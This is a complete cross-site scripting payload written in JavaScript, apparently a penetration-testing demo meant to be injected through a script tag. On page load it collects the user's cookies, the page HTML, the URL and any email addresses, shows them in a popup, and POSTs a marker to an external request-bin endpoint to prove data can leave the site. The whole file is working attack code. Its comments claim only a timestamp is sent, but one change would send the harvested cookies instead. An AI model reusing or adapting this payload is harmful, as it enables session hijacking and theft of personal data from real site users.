/**
 * Summary. XSS Expoit Test/Demo.
 *
 * Description. Glean data from screen. Display in Pop-up. Test POST to External site. (ID only, not data).
 *
 * @author JDL-84
 * @link https://jdl-84.github.io/CACHE-XSS/XSS.js
 */

//<script src='https://jdl-84.github.io/CACHE-XSS/XSS.js'/>

//Update Title for confirmation script loaded
//We're not trying to be surreptitious about the app testing!
document.title = "XSS-Active"

//APP SPECIFIC 
//Put Back the variable used to invoke the XSS
var websession  = '1';
var mysessionno  = '1';
//Reset the requried times 
var CurrDT          = new Date();
var TimeAsMS        = CurrDT.getTime();
var LastRefresh = TimeAsMS;
var timeoutlength = 9999000;
///////////////////////////////////////////////////

//Variables 
var UsersCookie;
var DocHTML;
var DocLocation;
var EmailAddresses;

//The internet POST destination for our exfiltrated data. 
var Toilet = "https://ptsv2.com/t/qo33d-1598654477";

function ExfiltrateData(ID)
{	
	 //The popup proves we can obtain the data. 
	 //Now we need to prove we can move it else where.
	 //We can't post anything that would indentify the application we've used this script against. 
	 //ID is the current Timestamp in MS so is a good unique identifer.  	 
	 //POST Request to Toilet 
	 const xhr = new XMLHttpRequest();
	 xhr.open("POST", Toilet+"/post", true);
	 xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
	 xhr.send("XSS-TEST-"+ID);	
}

//Build a space in the popup for the each bit of data 
function BuildContainer(doc,titletext,datatext,dataheight,hyperlink)
{
	if(datatext){	
	//Container
	var container = doc.document.createElement("div");
	container.setAttribute("class","center");
	
	//Title
	var Title = doc.document.createElement("div");
	Title.setAttribute("class","title");
	Title.innerHTML = titletext;
	container.appendChild(Title);
	
	//Data
	if(hyperlink ==1)
	{
		var HyperLink = doc.document.createElement("a");
		HyperLink.setAttribute("class","BTN");
		HyperLink.innerHTML = datatext;
		HyperLink.href = Toilet;
		HyperLink.target="_blank"
		container.appendChild(HyperLink);
	}
	else
	{
		var Datafield = doc.document.createElement("textarea");
		Datafield.setAttribute("class","DataArea");
		Datafield.innerHTML = datatext;
		Datafield.readOnly = "true";
		Datafield.style = "height:"+dataheight+"px;";
		container.appendChild(Datafield);
	}
	
	doc.document.body.appendChild(container);
	}//End If DataText
}

//Search for regex based data
function SearchByRegex(BODYTEXT,REGEX){
	var SB="";
	var regExParsed = new RegExp(REGEX, 'gi');
	var m;
	do {
		m = regExParsed.exec(BODYTEXT);
    if (m) 
	{
        SB += m[1]+"\r\n";
    }
	} while (m);	
	return SB;
}

//Create the popup to show possible data to exfiltrate. 
function createPopup(){
var pH =500;
var pW = 600;
var popup = open("", "", "width="+pW+"px,height="+pH+"px,toolbar=0,menubar=0,location=0,scrollbars=0,resizable=0");
//Header
var style= popup.document.createElement("style");
style.innerHTML  = ".grid-container,body,html{height:100%;margin:0}body{background:#353535}.center{margin:auto;padding:5px}.title{color:#fff;font-family:Arial,Helvetica,sans-serif;font-weight:700;font-size:12px;font-variant:small-caps}.DataArea{width:100%;height:100px;margin-top:5px;background:#1c1c1c;border:1px solid #3c3c3c;color:#900;font-family:'Courier New',Courier,monospace}.BTN{background:#1c1c1c;border:1px solid #3c3c3c;padding:3px;margin-top:5px;display:block;text-decoration:none;color:#900;font-family:'Courier New',Courier,monospace}";
popup.document.head.appendChild(style);
popup.document.title = "XSS Data Exfiltration";
//END Header

BuildContainer(popup,"Exfiltration ID",TimeAsMS,20,1);
BuildContainer(popup,"Document Location",DocLocation,20,0);
BuildContainer(popup,"Document Cookie",UsersCookie,100,0);
BuildContainer(popup,"Document Body InnerHTML",DocHTML,100,0);
BuildContainer(popup,"Gleaned - Email Addresses",SearchByRegex(DocHTML,"([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9_-]+)"),100,0);

//Close after sometime as they are annnoying me
setTimeout(function() { popup.close();}, 30000);
}

//Wait for page to load. If XSS is first then there isn't anything to read
window.addEventListener('load', function () {	

	//Get Secrets for display 
	UsersCookie = document.cookie;
	DocHTML = document.getElementsByTagName('body')[0].innerHTML;
	DocLocation = document.location.href;	

	ExfiltrateData(TimeAsMS);
	createPopup();

})

